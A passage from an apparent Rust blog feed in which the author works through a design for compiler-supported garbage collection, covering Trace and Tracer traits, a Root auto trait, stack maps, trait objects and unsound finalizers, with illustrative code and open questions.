<p>We could store some type information in the map and let the GC hardcode how to root each container
type. This isn&rsquo;t extensible though; the GC will have to be able to handle types from arbitrary
crates too. Additionally, we have to solve this problem anyway for tracing &mdash; when tracing we
need to be able to find all values &ldquo;contained&rdquo; within a particular value, which is the same
operation we need to do to find roots.</p>

<p>For this purpose, we introduce the <code>Trace</code> trait:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// in libcore</span>
</span><span class='line'><span class="k">unsafe</span> <span class="k">trait</span> <span class="n">Trace</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">trace</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// in libcollections</span>
</span><span class='line'><span class="c1">// (or any third-party collections library)</span>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">Trace</span><span class="o">&gt;</span> <span class="n">Trace</span> <span class="k">for</span> <span class="n">Vec</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">trace</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="bp">self</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">i</span><span class="p">.</span><span class="n">trace</span><span class="p">()</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// in gc library</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// only allow trace objects</span>
</span><span class='line'><span class="k">struct</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">Trace</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// ..</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">Trace</span> <span class="k">for</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">trace</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// mark `self`</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// Don&#39;t actually trace contained fields,</span>
</span><span class='line'>        <span class="c1">// because there may be cycles and we&#39;d recurse infinitely</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// in consumer of gc library</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// autoderived impl will call `bar.trace()` and `baz.trace()`</span>
</span><span class='line'><span class="cp">#[derive(Trace)]</span>
</span><span class='line'><span class="k">struct</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">bar</span><span class="o">:</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">Bar</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">baz</span><span class="o">:</span> <span class="n">SomeType</span><span class="p">,</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>(These traits are unsafe to implement because an incorrect implementation can lead to a
reachable value getting cleaned up by the GC, which is unsafe)</p>

<p>Basically, an implementation of Trace will yield all values owned by the object, unless that object
is a GC struct like <code>Gc&lt;T&gt;</code>, in which case the GC implementor will have it mark the object. This
way, calling <code>.trace()</code> will walk all fields and subfields of an object recursively, until it finds
all of the contained <code>Gc&lt;T&gt;</code>s.</p>

<p>This has an issue with multiple GCs, though &mdash; we don&rsquo;t want the GCs to interact unless they
want to, and with the <code>Trace</code> trait being shared one GC object may accidentally contain a different
GC object.</p>

<p>We need to introduce the concept of a tracer here.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// in libcore</span>
</span><span class='line'>
</span><span class='line'><span class="k">trait</span> <span class="n">Tracer</span> <span class="o">:</span> <span class="nb">Any</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="k">unsafe</span> <span class="k">trait</span> <span class="n">Trace</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">trace</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span> <span class="n">tracer</span><span class="o">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">Tracer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1">// in libcollections</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// impl doesn&#39;t care about the tracer</span>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">Trace</span><span class="o">&gt;</span> <span class="n">Trace</span> <span class="k">for</span> <span class="n">Vec</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">trace</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span> <span class="n">tracer</span><span class="o">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">Tracer</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="bp">self</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">i</span><span class="p">.</span><span class="n">trace</span><span class="p">(</span><span class="n">tracer</span><span class="p">)</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// in gc library</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">MyTracer</span> <span class="p">{}</span> <span class="c1">// more complicated tracers may have state</span>
</span><span class='line'><span class="k">impl</span> <span class="n">Tracer</span> <span class="k">for</span> <span class="n">MyTracer</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">Trace</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// ..</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">Trace</span> <span class="k">for</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">trace</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span> <span class="n">tracer</span><span class="o">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">Tracer</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="kd">let</span> <span class="nb">Some</span><span class="p">(</span><span class="n">tracer</span><span class="p">)</span> <span class="o">=</span> <span class="n">tracer</span><span class="p">.</span><span class="n">downcast_mut</span><span class="o">::&lt;</span><span class="n">MyTracer</span><span class="o">&gt;</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>            <span class="c1">// mark self</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">panic</span><span class="p">(</span><span class="s">&quot;Don&#39;t mix GCs!&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="c1">// If you want to support multiple GCs interacting with each other,</span>
</span><span class='line'>            <span class="c1">// you can let this else block trace the contents.</span>
</span><span class='line'>            <span class="c1">// Beware, interacting GCs have subtle safety issues.</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This also makes it easier to distinguish between rooting and tracing operations. While the
operations are similar (&ldquo;to root/trace a value, walk its fields recursively till you find all of the
Gc<T>s, and root/mark <em>those</em>&rdquo;), the code we run at the leaf <code>Gc&lt;T&gt;</code> nodes is different. In the
previous model, this could have been solved with a global static boolean that identifies if the code
is currently walking roots or tracing, but with the <code>Tracer</code> trait object we can just pass in
different tracer values.</p>

<p>We&rsquo;re not yet sure if we should be lumping root walking and tracing in a single trait; so we might
end up with a second <code>Scan</code> trait that works similarly.</p>

<p>Note that we&rsquo;re not getting rid of the Root trait here. This is because <code>Root</code> and <code>Trace</code> have
slightly incompatible purposes &ndash; <code>Root</code> signals to the compiler if something definitely contains
roots, whereas <code>Trace</code> marks things which are safe to put inside a GC. <code>bool</code> is <code>Trace</code>, but not
<code>Root</code>. <code>Vec&lt;Gc&lt;T&gt;&gt;</code> is <code>Trace</code> and <code>Root</code>, <code>Vec&lt;bool&gt;</code> is <code>Trace</code> but not <code>Root</code>. <code>&amp;T</code> and <code>&amp;mut T</code>
are neither. <code>Trace</code> will actually show up in trait bounds for GC code. <code>Root</code> will only be analysed
by the compiler itself, bounds like <code>R: Root</code> probably won&rsquo;t show up.</p>

<p>There should not be any types which are <code>Root</code> but not <code>Trace</code>, because this means the compiler
won&rsquo;t know what to do with them!</p>

<p>Now, when generating the stack map, we include the stack offset of all <code>Root</code> objects in scope, as
well as appropriate dynamic dispatch vtable pointers for the <code>Trace</code> implementation<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>. Walking the
stack involves calling the trace method on each entry in the stack map for each call site.</p>

<h2>Unresolved problems</h2>

<p>There are a lot of these. Suggestions very welcome.</p>

<h3>Trait objects</h3>

<p>Trait objects provide an interesting challenge. They may or may not contain roots, but what&rsquo;s more
important is that trait objects in libraries that know nothing about GC may also contain roots.</p>

<p>For example, if a library is dealing with a <code>Box&lt;SomeTrait&gt;</code>, and your code feeds it a
<code>Box&lt;SomeRoot as SomeTrait&gt;</code>, the trait object is now a root. If a gc is triggered while in
this call (perhaps by a callback), then this trait object should be counted as a root.</p>

<p>But this library didn&rsquo;t depend on the GC, and when it was compiled, it wasn&rsquo;t compiled with stack
map entries for this GC object.</p>

<p>There are two solutions here. The first is to recompile everything (including libstd) from scratch
with GC support on, and put all owned trait objects in the stack maps. They will have an extra
generated trace entry in the vtable that will ignore the object if it isn&rsquo;t a root. To put trait
objects inside <code>Gc&lt;T&gt;</code>, you will have to explicitly use <code>Box&lt;Trait+Trace&gt;</code>, however &ndash; this magical
trace entry is just for collecting roots.</p>

<p>The second solution is to simply not allow casting <code>Root</code> objects to owned trait objects. I feel
that there are use cases for both &ndash; the former has extra bloat and requires a custom libstd (which
could be distributed via rustup if necessary), but the latter restricts how you use trait objects.
Servo, for example, would probably prefer the latter since we don&rsquo;t put our DOM objects in owned
trait objects. But other GC users may want maximum flexibility. Letting people choose this via a
codegen flag (which can be controlled via cargo) might be a good idea.</p>

<h3>Should it be <code>Trace&lt;T&gt;</code>?</h3>

<p>There is a dynamic dispatch cost on rooting/tracing any <code>Gc&lt;T&gt;</code> leaf with the tracer model.</p>

<p>This can be obviated by having it be:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">trait</span> <span class="n">Trace</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">Tracer</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">trace</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span> <span class="n">tracer</span><span class="o">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">T</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Most types would implement <code>Trace&lt;T&gt;</code>, and GCs can implement <code>Trace&lt;SpecificTracer&gt;</code>,
and only require their contents to be <code>Trace&lt;SpecificTracer&gt;</code>. This lets the type system
forbid interacting GCs instead of having it done at runtime.</p>

<p>This has multiple downsides, however:</p>

<ul>
<li><code>#[derive(Trace)]</code> becomes <code>#[derive(Trace&lt;MyTracer&gt;)]</code> for things containing <code>Gc&lt;T&gt;</code> (because <code>Gc&lt;T&gt;</code> is not <code>Trace&lt;T&gt;</code> for all <code>T</code>, and macro expansion runs before this information can be computed).</li>
<li>If there are multiple GCs, there are multiple <code>Trace&lt;T&gt;</code> vtable pointers in the stack map. Not all libs know about the other GC when being compiled, so you need to defer generation of these stack map entries somehow.</li>
<li>The heuristics for forbidding types which are <code>Root</code> but not <code>Trace&lt;T&gt;</code> become subtler. You have to effectively forbid types which are <code>Root</code> but do not have an impl of <code>Trace&lt;T&gt;</code> for at least one tracer <code>T</code> that is active in the compilation.</li>
</ul>


<h3>Non-<code>Trace</code> collections on the stack</h3>

<p>If something like the following, defined by a third-party library:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">struct</span> <span class="n">Foo</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">x</span><span class="o">:</span> <span class="n">T</span><span class="p">,</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>doesn&rsquo;t implement <code>Trace</code>, it&rsquo;s still okay to use <code>Foo&lt;RootedThing&gt;</code> on the stack, because we can
figure out that the inner <code>T</code> is what we need to root.</p>

<p>However, if a third-party <code>MyVec&lt;T&gt;</code> (which behaves like a vector) contains <code>RootedThing</code>s, and is
on the stack, the compiler doesn&rsquo;t know what do do with it. Lack of a <code>Trace</code> bound makes it
impossible to put such types on the GC heap, but there&rsquo;s no restriction on putting these types on
the stack. As I mentioned before, we can simply forbid the existence of types which are <code>Root</code> but
not <code>Trace</code> (<code>MyVec&lt;RootedThing&gt;</code> is <code>Root</code>). This is already done with <code>Copy</code> and <code>Drop</code>.</p>

<p>There&rsquo;s a subtle difference between this and the <code>Copy</code>/<code>Drop</code> forbidding. <code>Copy</code> and <code>Drop</code> are
always explicitly implemented. On the other hand, <code>Root</code> is an auto trait and automatically
implements itself on types containing roots. This means that we can&rsquo;t necessarily forbid such types
being created at impl time &mdash; third party collections like above for example won&rsquo;t contain
<code>Root</code> types until they are monomorphised. We can error during monomorphization, but this error
might not be very user-friendly, like template errors in C++.</p>

<p>Another solution is to make <code>Root</code> into <code>?Root</code>, much like <code>?Sized</code>. This means that the writers of
collections will explicitly opt in to allowing GCd things inside them. This probably would lead to a
lot more churn, however. But the diagnostics would be clearer.</p>

<p>Turns out that
<a href="https://play.rust-lang.org/?gist=ad485dc2fc91e5c1aad53051dc207716&amp;version=nightly&amp;backtrace=0">this</a>
actually works with half-decent diagnostics. This doesn&rsquo;t forbid the existence of types which impl
Root but not Trace, however. It simply avoids autoderiving Root on types which aren&rsquo;t Trace. But
this behavior can be changed.
(In fact, it <a href="https://github.com/rust-lang/rust/pull/35745">was changed</a> while this post was being written!)</p>

<p>It becomes more complicated with Trace<T> though.
Having <code>Root&lt;T&gt;</code> might fix this, but then you have to deal with the auto trait generics.</p>

<p>One solution for the auto trait generics is to simple not include <code>Root</code> in the stdlib. Instead,
require code like the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// in gc library</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">MyTracer</span> <span class="p">{</span><span class="cm">/* .. */</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">Trace</span><span class="o">&lt;</span><span class="n">MyTracer</span><span class="o">&gt;&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#[gc_root_trait]</span>
</span><span class='line'><span class="k">unsafe</span> <span class="k">trait</span> <span class="n">MyRoot</span><span class="o">:</span> <span class="n">Trace</span><span class="o">&lt;</span><span class="n">MyTracer</span><span class="o">&gt;</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span> <span class="o">!</span><span class="n">MyRoot</span> <span class="k">for</span> <span class="p">..</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">Trace</span><span class="o">&lt;</span><span class="n">MyTracer</span><span class="o">&gt;&gt;</span> <span class="n">MyRoot</span> <span class="k">for</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This can be further simplified by completely removing the rooting trait requirement and instead
require <code>#[gc(tracer=MyTracer)]</code> on all GC structs. This, however, is a bit more special and we lose
the free diagnostics that you get from utilizing the type system.</p>

<h3>Are <code>Root</code>-containing raw pointers <code>Root</code>?</h3>

<p>For the auto-trait to work, types like <code>Vec&lt;ContainsRoot&gt;</code> should also be marked as <code>Root</code>.</p>

<p>This can be done by just marking <code>*const T</code> and <code>*mut T</code> as <code>Root</code> if <code>T</code> is <code>Root</code> using an impl in
libcore. However, borrowed types like <code>Iter</code> will also be dragged into this. We only want types
which <em>own</em> <code>Root</code> things to be considered roots.</p>

<p>The alternative is to not require this, and solely rely on <a href="https://doc.rust-lang.org/stable/nomicon/phantom-data.html"><code>PhantomData</code></a>. <code>Vec&lt;T&gt;</code> also
contains a <code>PhantomData&lt;T&gt;</code>, which gives the compiler a hint that it owns a <code>T</code>. On the other hand,
<code>Iter&lt;'a, T&gt;</code> contains a <code>PhantomData&lt;&amp;'a T&gt;</code>, which hints that it borrows a <code>T</code>. This is already
used by the compiler to determine drop soundness, so we can just use the same thing to determine
<code>Root</code> types. This is already supported by the autotrait infrastructure.</p>

<p>A downside here is that we&rsquo;re relying more on producers of unsafe code remembering to use
<code>PhantomData</code>. I&rsquo;m not 100% certain about this, but triggering dropck unsoundness by neglecting
<code>PhantomData</code> is still pretty hard (and often requires types like arenas), whereas forgetting a root
can very easily cause a GC segfault. I do not consider this to be a major downside.</p>

<h3>Finalizers and Drop</h3>

<p>The following code is unsafe:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">struct</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">bar</span><span class="o">:</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">Bar</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">baz</span><span class="o">:</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">Baz</span><span class="o">&gt;</span> <span class="c1">// baz can contain a Bar</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">impl</span> <span class="nb">Drop</span> <span class="k">for</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="nb">drop</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nb">println</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;{:?}&quot;</span><span class="p">,</span> <span class="o">*</span><span class="n">bar</span><span class="p">);</span>
</span><span class='line'>        <span class="c1">// or</span>
</span><span class='line'>        <span class="o">*</span><span class="bp">self</span><span class="p">.</span><span class="n">baz</span><span class="p">.</span><span class="n">bar</span><span class="p">.</span><span class="n">borrow_mut</span><span class="p">()</span> <span class="o">=</span> <span class="n">bar</span><span class="p">.</span><span class="n">clone</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Foo itself is used as a `Gc&lt;Foo&gt;`</span>
</span></code></pre></td></tr></table></div></figure>


<p>The problem is that destructors run in the sweep cycle of a GC, in some order. This means that <code>bar</code>
may have already been collected when <code>Foo</code>&rsquo;s destructor runs. While in many cases this can be solved
with a smart collection alrogithm, in the case where there&rsquo;s a cycle being collected there&rsquo;s nowhere
safe to start.</p>

<p>Additionally, further mutation of the graph after collection may extend the lifetime of a to-be-
collected variable.</p>

<p>A simple solution is to forbid all GC accesses during the collection phase. However, this means
dereferences too, and this will incur a cost on all GCd types &ndash; they stop being simple pointer
accesses. This solution places the burden on the GC implementor, instead of the compiler.</p>

<p>We have enough information in the type system to solve this &ndash; we can forbid <code>Drop</code> impls on types
which are explicitly <code>Root</code>. But it turns out that this isn&rsquo;t enough. Consider:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">trait</span> <span class="n">MyTrait</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">do_the_thing</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">struct</span> <span class="n">HijackableType</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">MyTrait</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">x</span><span class="o">:</span> <span class="n">T</span><span class="p">,</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="nb">Drop</span> <span class="k">for</span> <span class="n">HijackableType</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="nb">drop</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="bp">self</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">do_the_thing</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// in other library</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Bar</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">inner</span><span class="o">:</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">Baz</span><span class="o">&gt;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">impl</span> <span class="n">MyTrait</span> <span class="k">for</span> <span class="n">Bar</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">do_the_thing</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nb">println</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;{:?}&quot;</span><span class="p">,</span> <span class="o">*</span><span class="bp">self</span><span class="p">.</span><span class="n">inner</span><span class="p">)</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>Foo&lt;Bar&gt;</code> now has an unsafe destructor. Stopping this behavior requres forbidding Drop impls on
structs with trait bounds, but that is too restrictive.</p>

<p>This may end up having a similar solution to the &ldquo;all roots must be <code>Trace</code>&rdquo; issue. Warning on
monomorphizations isn&rsquo;t enough, we need to be able to allow <code>Vec&lt;ContainsRoot&gt;</code>, but not
<code>HijackableType&lt;ContainsRoot&gt;</code>. Making this distinction without poisoning half the generics out
there is tricky.</p>

<p>The notion of a hijackable type is actually already important for sound generic drop impls, see
<a href="https://github.com/rust-lang/rfcs/blob/master/text/1327-dropck-param-eyepatch.md">RFC 1327 (dropck eyepatch)</a>, <a href="https://github.com/rust-lang/rfcs/blob/master/text/1238-nonparametric-dropck.md">RFC 1238 (nonparametrick dropck)</a>,
and their predecessor, <a href="https://github.com/rust-lang/rfcs/blob/master/text/0769-sound-generic-drop.md">RFC 0769 (sound generic drop)</a>. We might be able to rely
on this, but would need to introduce additional constraints in dropck.</p>

<p>Fortunately, there is always the fallback solution of requiring the implementor to enforce this
constraint at runtime.</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Firefox does have a garbage collector and a cycle collector which interact, though, so it&rsquo;s not something which is unthinkable.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>If there is an active stack drop flag for the value, that will need to be included too.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fun Crypto Problem: Designing an Anonymous Reputation System]]></title>
    <link href="http://manishearth.github.io/blog/2016/08/14/fun-crypto-problem-designing-an-anonymous-reputation-system/"/>
    <updated>2016-08-14T13:15:31-07:00</updated>
    <id>http://manishearth.github.io/blog/2016/08/14/fun-crypto-problem-designing-an-anonymous-reputation-system</id>
